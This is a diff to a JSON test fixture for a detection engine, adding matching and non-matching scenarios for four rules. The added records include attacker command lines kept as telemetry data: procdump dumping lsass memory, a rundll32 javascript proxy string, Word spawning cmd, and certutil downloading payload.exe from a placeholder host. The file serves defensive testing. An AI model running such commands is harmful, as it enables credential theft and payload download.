@@ -1,6 +1,6 @@
 {
   "fixture_id": "phase1-detection-replay",
-  "description": "Hand-authored, deterministic raw-telemetry replay fixture (gate G1.2). Exercises raw record -> SourceAdapter -> Observation -> the real G1.0 DetectionEngine -> Evidence. Unlike phase0_benign_scenarios.json, no scenario here asserts its own rule id or ATT&CK mapping -- whether anything fires, and what it maps to, is decided entirely by evaluating these scenarios against fixtures/phase1_core_rules.json. Not real detection-engineering content; not used to validate detection efficacy.",
+  "description": "Hand-authored, deterministic raw-telemetry replay fixture (gates G1.2, G1.3). Exercises raw record -> SourceAdapter -> Observation -> the real G1.0 DetectionEngine -> Evidence. Unlike phase0_benign_scenarios.json, no scenario here asserts its own rule id or ATT&CK mapping -- whether anything fires, and what it maps to, is decided entirely by evaluating these scenarios against fixtures/phase1_core_rules.json. G1.3 appended a matching and a relevant non-matching scenario for each of the four rules it added, after the original three G1.2 scenarios (kept at their original indices for test stability). Not real detection-engineering content; not used to validate detection efficacy.",
   "scenarios": [
     {
       "scenario_id": "encoded-powershell-matches-platform-rule",
@@ -38,6 +38,102 @@
       },
       "event": {
         "action": "process-start"
+      }
+    },
+    {
+      "scenario_id": "procdump-lsass-target-matches-credential-rule",
+      "raw_record": {
+        "record_id": "evt-2001",
+        "timestamp": "2026-02-01T09:15:00+00:00",
+        "observation_id": "obs-2001"
+      },
+      "process": {
+        "name": "procdump.exe",
+        "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp"
+      }
+    },
+    {
+      "scenario_id": "procdump-non-lsass-target-does-not-match",
+      "raw_record": {
+        "record_id": "evt-2002",
+        "timestamp": "2026-02-01T09:16:00+00:00",
+        "observation_id": "obs-2002"
+      },
+      "process": {
+        "name": "procdump.exe",
+        "command_line": "procdump.exe -ma notepad.exe C:\\temp\\notepad.dmp"
+      }
+    },
+    {
+      "scenario_id": "rundll32-javascript-proxy-matches-rule",
+      "raw_record": {
+        "record_id": "evt-2003",
+        "timestamp": "2026-02-01T09:17:00+00:00",
+        "observation_id": "obs-2003"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('x')"
+      }
+    },
+    {
+      "scenario_id": "rundll32-benign-control-panel-invocation-does-not-match",
+      "raw_record": {
+        "record_id": "evt-2004",
+        "timestamp": "2026-02-01T09:18:00+00:00",
+        "observation_id": "obs-2004"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe shell32.dll,Control_RunDLL"
+      }
+    },
+    {
+      "scenario_id": "cmd-spawned-by-word-matches-office-shell-rule",
+      "raw_record": {
+        "record_id": "evt-2005",
+        "timestamp": "2026-02-01T09:19:00+00:00",
+        "observation_id": "obs-2005"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "parent_name": "WINWORD.EXE"
+      }
+    },
+    {
+      "scenario_id": "cmd-spawned-by-explorer-does-not-match-office-shell-rule",
+      "raw_record": {
+        "record_id": "evt-2006",
+        "timestamp": "2026-02-01T09:20:00+00:00",
+        "observation_id": "obs-2006"
+      },
+      "process": {
+        "name": "cmd.exe",
+        "parent_name": "EXPLORER.EXE"
+      }
+    },
+    {
+      "scenario_id": "certutil-urlcache-download-matches-ingress-transfer-rule",
+      "raw_record": {
+        "record_id": "evt-2007",
+        "timestamp": "2026-02-01T09:21:00+00:00",
+        "observation_id": "obs-2007"
+      },
+      "process": {
+        "name": "certutil.exe",
+        "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe"
+      }
+    },
+    {
+      "scenario_id": "certutil-hashfile-does-not-match-ingress-transfer-rule",
+      "raw_record": {
+        "record_id": "evt-2008",
+        "timestamp": "2026-02-01T09:22:00+00:00",
+        "observation_id": "obs-2008"
+      },
+      "process": {
+        "name": "certutil.exe",
+        "command_line": "certutil.exe -hashfile file.txt SHA256"
       }
     }
   ]
